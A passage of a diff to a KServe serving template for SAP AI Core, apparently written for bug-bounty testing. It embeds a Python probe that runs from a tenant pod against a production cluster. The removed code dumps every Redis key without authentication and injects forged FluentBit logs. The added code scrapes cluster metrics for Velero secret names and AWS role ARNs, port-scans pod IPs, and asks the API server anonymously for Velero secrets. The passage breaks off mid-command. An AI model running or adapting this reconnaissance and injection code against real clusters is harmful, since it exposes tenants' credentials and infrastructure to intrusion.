@@ -1,14 +1,14 @@
 apiVersion: ai.sap.com/v1alpha1
 kind: ServingTemplate
 metadata:
-  name: impact-probe-v12
+  name: impact-probe-v13
   labels:
-    scenarios.ai.sap.com/id: "impact-probe-v12"
+    scenarios.ai.sap.com/id: "impact-probe-v13"
     ai.sap.com/version: "1.0.0"
   annotations:
-    scenarios.ai.sap.com/name: "impact-probe-v12"
-    executables.ai.sap.com/name: "impact-probe-v12"
-    executables.ai.sap.com/description: "FluentBit inject + OTel TA2 + Redis probe v12"
+    scenarios.ai.sap.com/name: "impact-probe-v13"
+    executables.ai.sap.com/name: "impact-probe-v13"
+    executables.ai.sap.com/description: "Velero credential recon probe v13"
 spec:
   template:
     apiVersion: "serving.kserve.io/v1beta1"
@@ -28,11 +28,11 @@ spec:
           args:
           - |
             cat > /tmp/probe.py << 'PYEOF'
-            import socket, time, ssl, json, struct
+            import socket, ssl, re, json, time
             import urllib.request, urllib.error
 
             def report(k, v):
-                print(f"[P12] {k}: {str(v)[:8000]}", flush=True)
+                print(f"[P13] {k}: {str(v)[:8000]}", flush=True)
 
             def http_get(url, headers=None, timeout=10):
                 try:
@@ -50,261 +50,205 @@ spec:
                 except Exception as e:
                     return f"ERR:{type(e).__name__}:{e}", 0, {}
 
-            # ── MSGPACK HELPERS (correct uint32/uint64 support) ───────────────────
-            def mp_str(s):
-                b = s.encode("utf-8")
-                n = len(b)
-                if n <= 31:
-                    return bytes([0xa0 | n]) + b
-                elif n <= 0xffff:
-                    return struct.pack(">BH", 0xda, n) + b
-                else:
-                    return struct.pack(">BI", 0xdb, n) + b
-
-            def mp_uint(n):
-                if n <= 0x7f:
-                    return struct.pack("B", n)
-                elif n <= 0xff:
-                    return struct.pack(">BB", 0xcc, n)
-                elif n <= 0xffff:
-                    return struct.pack(">BH", 0xcd, n)
-                elif n <= 0xffffffff:
-                    return struct.pack(">BI", 0xce, n)
-                else:
-                    return struct.pack(">BQ", 0xcf, n)
-
-            def mp_map(d):
-                n = len(d)
-                hdr = bytes([0x80 | n]) if n <= 15 else struct.pack(">BH", 0xde, n)
-                body = b""
-                for k, v in d.items():
-                    body += mp_str(k) + mp_str(str(v))
-                return hdr + body
-
-            def mp_array(items):
-                n = len(items)
-                hdr = bytes([0x90 | n]) if n <= 15 else struct.pack(">BH", 0xdc, n)
-                return hdr + b"".join(items)
-
-            # ── REDIS CLIENT ──────────────────────────────────────────────────────
-            class Redis:
-                def __init__(self, host, port=6379, timeout=8):
-                    self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    self.s.settimeout(timeout)
-                    self.s.connect((host, port))
-                    self.buf = b""
-
-                def _send(self, *args):
-                    cmd = f"*{len(args)}\r\n"
-                    for a in args:
-                        a = str(a)
-                        cmd += f"${len(a)}\r\n{a}\r\n"
-                    self.s.sendall(cmd.encode())
-
-                def _recv_line(self):
-                    while b"\r\n" not in self.buf:
-                        c = self.s.recv(65536)
-                        if not c:
-                            break
-                        self.buf += c
-                    line, _, self.buf = self.buf.partition(b"\r\n")
-                    return line.decode(errors="replace")
-
-                def _read(self):
-                    line = self._recv_line()
-                    if not line:
-                        return None
-                    t, data = line[0], line[1:]
-                    if t == '+': return data
-                    if t == '-': return f"ERR:{data}"
-                    if t == ':': return int(data)
-                    if t == '$':
-                        n = int(data)
-                        if n == -1: return None
-                        out = b""
-                        while len(out) < n + 2:
-                            out += self.s.recv(n + 2 - len(out))
-                        self.buf = out[n+2:] + self.buf
-                        return out[:n].decode(errors="replace")
-                    if t == '*':
-                        c = int(data)
-                        return None if c == -1 else [self._read() for _ in range(c)]
-                    return line
-
-                def cmd(self, *args):
-                    self._send(*args)
-                    return self._read()
-
-                def close(self):
-                    try: self.s.close()
-                    except: pass
-
-            # ── 1. REDIS AT 100.104.166.183:6379 ─────────────────────────────────
-            report("---", "=== 1. REDIS 100.104.166.183:6379 ===")
-            try:
-                r = Redis("100.104.166.183", 6379, timeout=8)
-                pong = r.cmd("PING")
-                report("REDIS_PING", pong)
-
-                # Try to read INFO regardless of auth
-                info = r.cmd("INFO", "server")
-                report("REDIS_INFO_SERVER", info)
-
-                info_all = r.cmd("INFO", "all")
-                report("REDIS_INFO_ALL", info_all)
-
-                # CONFIG GET
-                cfg = r.cmd("CONFIG", "GET", "*")
-                report("REDIS_CONFIG", str(cfg)[:3000])
-
-                # CLIENT LIST
-                report("REDIS_CLIENT_LIST", r.cmd("CLIENT", "LIST"))
-
-                # Keys across all DBs
-                for db in range(16):
-                    r.cmd("SELECT", db)
-                    sz = r.cmd("DBSIZE")
-                    if sz and isinstance(sz, int) and sz > 0:
-                        report(f"REDIS_DB{db}_SIZE", sz)
-                        r.cmd("SELECT", db)
-                        keys = r.cmd("KEYS", "*")
-                        report(f"REDIS_DB{db}_KEYS", keys)
-                        if keys and isinstance(keys, list):
-                            for key in keys[:30]:
-                                try:
-                                    ktype = r.cmd("TYPE", key)
-                                    ttl = r.cmd("TTL", key)
-                                    if ktype == "string":
-                                        val = r.cmd("GET", key)
-                                    elif ktype == "hash":
-                                        val = r.cmd("HGETALL", key)
-                                    elif ktype == "list":
-                                        val = r.cmd("LRANGE", key, "0", "20")
-                                    elif ktype == "set":
-                                        val = r.cmd("SMEMBERS", key)
-                                    else:
-                                        val = "?"
-                                    report(f"REDIS_DB{db}_KEY_{key}", f"[{ktype}] ttl={ttl} {str(val)[:600]}")
-                                except Exception as ke:
-                                    report(f"REDIS_DB{db}_KEY_{key}_ERR", str(ke))
-
-                r.close()
-            except ConnectionRefusedError as e:
-                report("REDIS_ERR", f"ECONNREFUSED: {e}")
-            except socket.timeout:
-                report("REDIS_ERR", "ETIMEDOUT")
-            except OSError as e:
-                report("REDIS_ERR", f"OSError {e.errno}: {e}")
-            except Exception as e:
-                import traceback
-                report("REDIS_ERR", f"{type(e).__name__}: {e}\n{traceback.format_exc()[:800]}")
-
-            # ── 2. FLUENTBIT FORWARD INPUT — FIXED MSGPACK ────────────────────────
-            report("---", "=== 2. FLUENTBIT LOG INJECTION (port 24224) ===")
-
-            def fluent_forward_msg(tag, record):
-                ts = int(time.time())
-                # Entry: [timestamp, record]
-                entry = mp_array([mp_uint(ts), mp_map(record)])
-                # Entries array: [[ts, record]]
-                entries = mp_array([entry])
-                # Full message: [tag, entries, options]
-                msg = mp_array([mp_str(tag), entries, mp_map({})])
-                return msg
-
-            fb_targets = [
-                "100.64.76.16",
-                "100.64.33.11",
-                "100.109.242.36",
-            ]
-            record = {
-                "log":    "SAP AI Core security probe: unauthenticated log injection via FluentBit forward input port 24224 from KServe tenant pod",
-                "tenant": "cf-aicore-security-bb-12",
-                "pod":    "impact-probe-v12",
-                "level":  "SECURITY_FINDING",
-                "source": "rce_impact_probe",
-            }
-            for fb_host in fb_targets:
+            def tcp_probe(host, port, timeout=5):
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(6)
+                s.settimeout(timeout)
                 try:
-                    s.connect((fb_host, 24224))
-                    report(f"FLUENTBIT_{fb_host}_TCP", "CONNECTED")
-                    payload = fluent_forward_msg("security.probe.rce", record)
-                    report(f"FLUENTBIT_{fb_host}_PAYLOAD_LEN", len(payload))
-                    s.sendall(payload)
-                    time.sleep(2)
-                    s.settimeout(3)
-                    try:
-                        resp = s.recv(256)
-                        report(f"FLUENTBIT_{fb_host}_RESPONSE", f"bytes={len(resp)} {resp[:100]!r}")
-                    except socket.timeout:
-                        report(f"FLUENTBIT_{fb_host}_RESPONSE", "no ACK (accepted silently — normal for forward mode)")
+                    s.connect((host, port))
                     s.close()
-                    report(f"FLUENTBIT_{fb_host}_RESULT", "INJECTION SENT")
+                    return "OPEN"
+                except socket.timeout:
+                    return "TIMEOUT"
                 except ConnectionRefusedError:
-                    report(f"FLUENTBIT_{fb_host}", "ECONNREFUSED")
+                    return "REFUSED"
                 except OSError as e:
-                    if e.errno == 104:
-                        report(f"FLUENTBIT_{fb_host}", "ECONNRESET (Istio)")
-                    else:
-                        report(f"FLUENTBIT_{fb_host}", f"OSError {e.errno}: {e}")
-                except Exception as e:
-                    report(f"FLUENTBIT_{fb_host}_ERR", f"{type(e).__name__}: {e}")
+                    return f"OSError_{e.errno}"
                 finally:
                     try: s.close()
                     except: pass
 
-            # ── 3. SECOND OTEL TARGET ALLOCATOR (100.106.186.136:80) ─────────────
-            report("---", "=== 3. SECOND OTEL TARGET ALLOCATOR (100.106.186.136:80) ===")
+            KSM = "http://ksm-multi-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics"
+            KSM_CUSTOM = "http://ksm-custom-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics"
+            TA = "http://otel-scraper-targetallocator.opentelemetry.svc.cluster.local:80"
             TA2 = "http://100.106.186.136:80"
 
-            body, code, _ = http_get(f"{TA2}/", timeout=8)
-            report("TA2_ROOT", f"[{code}] {body[:500]}")
-
-            # Jobs list
-            body, code, _ = http_get(f"{TA2}/jobs", timeout=10)
-            report("TA2_JOBS", f"[{code}] {body[:3000]}")
-
-            # All job targets
-            body, code, _ = http_get(f"{TA2}/debug/jobs", timeout=10)
-            report("TA2_DEBUG_JOBS", f"[{code}] {body[:3000]}")
-
-            # Scrape configs
-            body, code, _ = http_get(f"{TA2}/debug/scrape_configs", timeout=10)
-            report("TA2_SCRAPE_CONFIGS", f"[{code}] {body[:5000]}")
-
-            # Targets
-            body, code, _ = http_get(f"{TA2}/debug/targets", timeout=10)
-            report("TA2_TARGETS", f"[{code}] {body[:3000]}")
-
-            # Known job paths from other TA
-            for job in ["kubernetes-pods", "kubernetes-nodes", "kubernetes-endpointslices",
-                        "kubernetes-nodes-cadvisor", "kubernetes-service-endpoints"]:
-                body, code, _ = http_get(f"{TA2}/jobs/{job}/targets", timeout=10)
-                if code == 200:
-                    report(f"TA2_JOB_{job}", body[:3000])
-                else:
-                    report(f"TA2_JOB_{job}", f"[{code}] {body[:200]}")
-
-            # ── 4. COMPARE WITH KNOWN OTel TA ────────────────────────────────────
-            report("---", "=== 4. KNOWN OTEL TA JOBS REFRESH ===")
-            TA1 = "http://otel-scraper-targetallocator.opentelemetry.svc.cluster.local:80"
-            body, code, _ = http_get(f"{TA1}/jobs", timeout=10)
-            report("TA1_JOBS", f"[{code}] {body[:2000]}")
-
-            body, code, _ = http_get(f"{TA1}/jobs/kubernetes-pods/targets", timeout=12)
+            # ── 1. KSM: velero namespace -- pod IPs, annotations, SA, secrets ────
+            report("---", "=== 1. KSM: VELERO NAMESPACE FULL DUMP ===")
+            body, code, _ = http_get(KSM, timeout=20)
             if code == 200:
-                # Extract pod IPs and images we haven't seen before
-                import re
-                images = re.findall(r'"__meta_kubernetes_pod_container_image":"([^"]+)"', body)
-                namespaces = re.findall(r'"__meta_kubernetes_namespace":"([^"]+)"', body)
-                unique_images = list(set(images))
-                unique_ns = list(set(namespaces))
-                report("TA1_POD_IMAGES", "\n".join(sorted(unique_images)[:60]))
-                report("TA1_POD_NAMESPACES", "\n".join(sorted(unique_ns)[:40]))
+                lines = body.split("\n")
 
-            report("DONE", "probe v12 complete")
+                # Pod info -- get pod IPs and node placement
+                velero_pod = [l for l in lines
+                              if "velero" in l.lower() and not l.startswith("#") and l.strip()]
+                report("KSM_VELERO_ALL_METRICS", "\n".join(velero_pod[:200]))
+
+                # Specifically: kube_pod_info for pod IPs
+                pod_info = [l for l in lines
+                            if 'kube_pod_info' in l and 'velero' in l and not l.startswith("#")]
+                report("KSM_VELERO_POD_INFO", "\n".join(pod_info))
+
+                # Pod annotations -- IRSA role ARN lives here
+                pod_ann = [l for l in lines
+                           if 'kube_pod_annotation' in l and 'velero' in l and not l.startswith("#")]
+                report("KSM_VELERO_POD_ANNOTATIONS", "\n".join(pod_ann[:50]))
+
+                # ServiceAccount annotations -- eks.amazonaws.com/role-arn
+                sa_lines = [l for l in lines
+                            if ('kube_serviceaccount' in l or 'service_account' in l.lower())
+                            and 'velero' in l and not l.startswith("#")]
+                report("KSM_VELERO_SA", "\n".join(sa_lines[:30]))
+
+                # Secret info -- names of secrets in velero namespace
+                secret_lines = [l for l in lines
+                                if 'kube_secret' in l and 'velero' in l and not l.startswith("#")]
+                report("KSM_VELERO_SECRETS", "\n".join(secret_lines[:30]))
+
+                # ConfigMap info
+                cm_lines = [l for l in lines
+                            if 'kube_configmap' in l and 'velero' in l and not l.startswith("#")]
+                report("KSM_VELERO_CONFIGMAPS", "\n".join(cm_lines[:20]))
+
+                # CronJob info
+                cj_lines = [l for l in lines
+                            if 'kube_cronjob' in l and 'velero' in l and not l.startswith("#")]
+                report("KSM_VELERO_CRONJOBS", "\n".join(cj_lines[:20]))
+
+                # Extract pod IPs from kube_pod_info
+                pod_ips = re.findall(r'kube_pod_info\{[^}]*namespace="velero"[^}]*pod_ip="([^"]+)"', body)
+                report("KSM_VELERO_POD_IPS", pod_ips)
+            else:
+                report("KSM_ERR", f"[{code}]")
+
+            # ── 2. KSM CUSTOM: Velero CRDs (BackupStorageLocation, Schedule) ─────
+            report("---", "=== 2. KSM CUSTOM: VELERO CRDs ===")
+            body_c, code_c, _ = http_get(KSM_CUSTOM, timeout=20)
+            if code_c == 200:
+                lines = body_c.split("\n")
+                velero_crd = [l for l in lines
+                              if "velero" in l.lower() and not l.startswith("#") and l.strip()]
+                report("KSM_CUSTOM_VELERO", "\n".join(velero_crd[:100]))
+                # Also look for backup/restore metrics
+                backup_lines = [l for l in lines
+                                if any(x in l.lower() for x in ["backup", "restore", "schedule", "bsl", "vsl"])
+                                and not l.startswith("#") and l.strip()]
+                report("KSM_CUSTOM_BACKUP", "\n".join(backup_lines[:50]))
+            else:
+                report("KSM_CUSTOM_ERR", f"[{code_c}]")
+
+            # ── 3. OTel TA: endpointslice targets for velero ─────────────────────
+            report("---", "=== 3. OTel TA: VELERO ENDPOINTSLICE + POD TARGETS ===")
+            for ta_url in [TA, TA2]:
+                body, code, _ = http_get(f"{ta_url}/jobs/kubernetes-endpointslices/targets", timeout=15)
+                if code == 200:
+                    # Filter velero entries
+                    try:
+                        data = json.loads(body)
+                        for collector, info in data.items():
+                            for target in info.get("targets", []):
+                                labels = target.get("labels", {})
+                                if "velero" in str(labels).lower():
+                                    report(f"TA_VELERO_TARGET_{ta_url[-15:]}", json.dumps(labels, indent=2)[:3000])
+                    except Exception as e:
+                        # Try regex if JSON parse fails
+                        velero_parts = re.findall(r'\{[^}]*velero[^}]*\}', body)
+                        report(f"TA_VELERO_REGEX_{ta_url[-15:]}", "\n".join(velero_parts[:10]))
+
+                body2, code2, _ = http_get(f"{ta_url}/jobs/kubernetes-pods/targets", timeout=15)
+                if code2 == 200:
+                    try:
+                        data2 = json.loads(body2)
+                        for collector, info in data2.items():
+                            for target in info.get("targets", []):
+                                labels = target.get("labels", {})
+                                if "velero" in str(labels).lower():
+                                    report(f"TA_VELERO_POD_{ta_url[-15:]}", json.dumps(labels, indent=2)[:3000])
+                    except:
+                        pass
+
+            # ── 4. Direct probe of velero pod IPs ────────────────────────────────
+            report("---", "=== 4. DIRECT VELERO POD IP PROBES ===")
+            # Known velero pod from image scan: velero-service-84ccf5468d-6h82d
+            # Pod IPs are in 100.64.x.x range -- try to get from KSM above
+            # Also try the known velero pod image pod from probe v3 data
+            # We'll scan a wider range based on known pod CIDR patterns
+            # From KSM we expect to extract actual IPs; also try known ranges
+
+            velero_candidate_ips = []
+            # Re-query KSM to extract velero pod IPs reliably
+            body_ksm, _, _ = http_get(KSM, timeout=20)
+            matches = re.findall(
+                r'kube_pod_info\{[^}]*namespace="velero"[^}]*\}\s+([\d.]+)',
+                body_ksm
+            )
+            report("KSM_VELERO_POD_IP_EXTRACTED", matches)
+
+            # Also try regex variant for pod_ip label
+            matches2 = re.findall(
+                r'namespace="velero"[^}]*pod_ip="([^"]+)"',
+                body_ksm
+            )
+            report("KSM_VELERO_POD_IP_LABEL", matches2)
+
+            velero_candidate_ips = list(set(matches + matches2))
+            report("VELERO_IPS_TO_PROBE", velero_candidate_ips)
+
+            for ip in velero_candidate_ips:
+                report(f"VELERO_POD_{ip}", f"probing...")
+                for port in [8085, 8080, 8443, 11001, 2112]:
+                    result = tcp_probe(ip, port, timeout=5)
+                    report(f"VELERO_{ip}:{port}_TCP", result)
+                    if result == "OPEN":
+                        body, code, hdrs = http_get(f"http://{ip}:{port}/", timeout=6)
+                        report(f"VELERO_{ip}:{port}_HTTP_ROOT", f"[{code}] {body[:500]}")
+                        for path in ["/metrics", "/api/v1", "/backup-storage-locations",
+                                     "/health", "/version"]:
+                            b2, c2, _ = http_get(f"http://{ip}:{port}{path}", timeout=6)
+                            if c2 not in (0,) and "ERR:timed" not in b2:
+                                report(f"VELERO_{ip}:{port}{path.replace('/','_')}", f"[{c2}] {b2[:1000]}")
+
+            # ── 5. Velero service DNS -- try all known ports ──────────────────────
+            report("---", "=== 5. VELERO SERVICE DNS ALL PORTS ===")
+            velero_dns = "velero.velero.svc.cluster.local"
+            for port in [8085, 8080, 8443, 11001, 2112, 80, 443]:
+                result = tcp_probe(velero_dns, port, timeout=5)
+                report(f"VELERO_DNS:{port}_TCP", result)
+                if result == "OPEN":
+                    body, code, hdrs = http_get(f"http://{velero_dns}:{port}/metrics", timeout=6)
+                    report(f"VELERO_DNS:{port}_METRICS", f"[{code}] {body[:1000]}")
+
+            # ── 6. KSM: AWS role ARN scan across ALL namespaces ──────────────────
+            report("---", "=== 6. KSM: eks.amazonaws.com/role-arn ACROSS ALL NS ===")
+            body_ksm2, code2, _ = http_get(KSM, timeout=20)
+            if code2 == 200:
+                # Look for IRSA role ARN annotations in pod/SA metrics
+                arn_lines = [l for l in body_ksm2.split("\n")
+                             if "arn:aws" in l.lower() or "role_arn" in l.lower()
+                             or "eks_amazonaws" in l.lower()
+                             and not l.startswith("#")]
+                report("KSM_ARN_LINES", "\n".join(arn_lines[:40]))
+
+                # Also look for AWS account IDs (12-digit numbers in arn context)
+                arns = re.findall(r'arn:aws:[^\s"\']+', body_ksm2)
+                report("KSM_ALL_ARNS", "\n".join(list(set(arns))[:30]))
+
+            # ── 7. Velero BackupStorageLocation via kubectl-equivalent ────────────
+            report("---", "=== 7. VELERO BSL VIA API SERVER (anonymous) ===")
+            # Try the K8s API server with anonymous access for velero CRDs
+            api_server = "https://api.sec-eu10.mlfprod.internal.live.k8s.ondemand.com"
+            for path in [
+                "/apis/velero.io/v1/backupstoragelocations",
+                "/apis/velero.io/v1/schedules",
+                "/apis/velero.io/v1/backups",
+                "/apis/velero.io/v1",
+                "/api/v1/namespaces/velero/secrets",
+                "/api/v1/namespaces/velero/configmaps",
+                "/apis/velero.io",
+            ]:
+                body, code, hdrs = http_get(f"{api_server}{path}", timeout=8)
+                report(f"APISERVER{path.replace('/','_')}", f"[{code}] {body[:500]}")
+
+            report("DONE", "probe v13 complete")
             PYEOF
             python3 /tmp/probe.py 2>&1
             python3 -c "
